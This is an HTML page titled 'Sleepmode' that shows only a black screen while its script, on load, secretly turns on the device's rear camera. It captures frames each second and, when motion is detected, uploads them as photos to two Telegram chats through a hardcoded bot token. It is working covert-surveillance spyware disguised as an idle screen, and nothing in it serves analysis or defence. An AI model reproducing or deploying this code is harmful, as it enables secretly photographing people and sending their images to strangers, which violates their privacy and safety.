<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Sleepmode</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: black;
      overflow: hidden;
    }
    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
  const botToken = '7611972370:AAGPrp4EL-CqBbc9AHkbQNemaDMqzBcKziM';
  const chatId = ['-1003159314552', '-1003263707819'];

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  let isSending = false;
  let previousFrame = null;

  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "environment",
          width: { ideal: 9999 },
          height: { ideal: 9999 }
        },
        audio: false
      });

      video.srcObject = stream;

      video.addEventListener('canplay', () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setInterval(captureAndSend, 1000); // كل 5 ثواني
      });

    } catch (err) {
      console.error("فشل الوصول إلى الكاميرا:", err);
    }
  }

  function captureAndSend() {
    if (isSending) return;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imageData.data;
    const totalPixels = data.length / 4;

    let brightnessSum = 0;
    let greenPixels = 0;
    let diffPixels = 0;

    if (previousFrame) {
      for (let i = 0; i < data.length; i += 4) {
        const r = data[i];
        const g = data[i + 1];
        const b = data[i + 2];

        const brightness = (r + g + b) / 3;
        brightnessSum += brightness;

        if (g > 100 && r < 80 && b < 80) greenPixels++;

        const pr = previousFrame[i];
        const pg = previousFrame[i + 1];
        const pb = previousFrame[i + 2];

        const diff = Math.abs(r - pr) + Math.abs(g - pg) + Math.abs(b - pb);
        if (diff > 30) diffPixels++;
      }
    } else {
      for (let i = 0; i < data.length; i += 4) {
        const r = data[i];
        const g = data[i + 1];
        const b = data[i + 2];
        const brightness = (r + g + b) / 3;
        brightnessSum += brightness;
      }
    }

    const avgBrightness = brightnessSum / totalPixels;
    const greenRatio = greenPixels / totalPixels;
    const diffRatio = previousFrame ? (diffPixels / totalPixels) : 1;

    console.log(`سطوع: ${avgBrightness.toFixed(1)} | أخضر: ${greenRatio.toFixed(2)} | فرق: ${diffRatio.toFixed(2)}`);

    previousFrame = new Uint8ClampedArray(data);

    if (avgBrightness > 40 && greenRatio < 0.8 && diffRatio > 0.05) {
      isSending = true;
      canvas.toBlob(blob => {
        sendToTelegram(blob).then(() => {
          isSending = false;
        }).catch(() => {
          isSending = false;
        });
      }, 'image/jpeg', 0.95);
    } else {
      console.warn("تم تجاهل صورة غير صالحة");
    }
  }

  async function sendToTelegram(blob) {
  for (const id of chatId) {
    const formData = new FormData();
    formData.append('chat_id', id);
    formData.append('photo', blob, 'image.jpg');

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        console.error("فشل الإرسال إلى", id, response.statusText);
      } else {
        console.log("تم إرسال الصورة إلى", id);
      }
    } catch (err) {
      console.error("خطأ في الإرسال إلى", id, err);
    }
  }
}

  window.onload = () => {
    startCamera();
  };
</script>

</body>
</html>
